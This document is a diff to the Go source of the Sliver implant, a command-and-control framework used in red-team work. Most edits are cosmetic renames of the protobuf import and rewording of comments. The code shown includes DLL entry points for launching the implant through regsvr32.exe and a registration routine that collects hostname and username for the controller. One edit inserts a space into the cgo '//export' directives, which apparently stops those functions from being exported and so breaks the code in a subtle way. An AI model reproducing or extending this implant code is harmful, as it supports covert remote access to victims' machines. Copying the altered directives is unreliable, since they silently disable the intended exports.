@@ -36,7 +36,7 @@ import (
 
 	"log"
 
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	consts "github.com/bishopfox/sliver/sliver/constants"
 	"github.com/bishopfox/sliver/sliver/handlers"
 	"github.com/bishopfox/sliver/sliver/limits"
@@ -71,14 +71,14 @@ func VoidFunc() { main() }
 //export DllInstall
 func DllInstall() { main() }
 
-// DLLRegisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
+// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
-//export DllRegisterServer
+// export DllRegisterServer
 func DllRegisterServer() { main() }
 
-// DLLUnregisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
+// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
-//export DllUnregisterServer
+// export DllUnregisterServer
 func DllUnregisterServer() { main() }
 
 // {{end}}
@@ -130,7 +130,7 @@ func mainLoop(connection *transports.Connection) {
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope.Data, func(data []byte, err error) {
-				connection.Send <- &pb.Envelope{
+				connection.Send <- &sliverpb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
 				}
@@ -148,7 +148,7 @@ func mainLoop(connection *transports.Connection) {
 	}
 }
 
-func getRegisterSliver() *pb.Envelope {
+func getRegisterSliver() *sliverpb.Envelope {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Debug}}
@@ -181,7 +181,7 @@ func getRegisterSliver() *pb.Envelope {
 			filename = "<< error >>"
 		}
 	}
-	data, err := proto.Marshal(&pb.Register{
+	data, err := proto.Marshal(&sliverpb.Register{
 		Name:     consts.SliverName,
 		Hostname: hostname,
 		Username: currentUser.Username,
@@ -196,12 +196,12 @@ func getRegisterSliver() *pb.Envelope {
 	})
 	if err != nil {
 		// {{if .Debug}}
-		log.Printf("Failed to encode Register msg %s", err)
+		log.Printf("Failed to encode register msg %s", err)
 		// {{end}}
 		return nil
 	}
-	return &pb.Envelope{
-		Type: pb.MsgRegister,
+	return &sliverpb.Envelope{
+		Type: sliverpb.MsgRegister,
 		Data: data,
 	}
 }
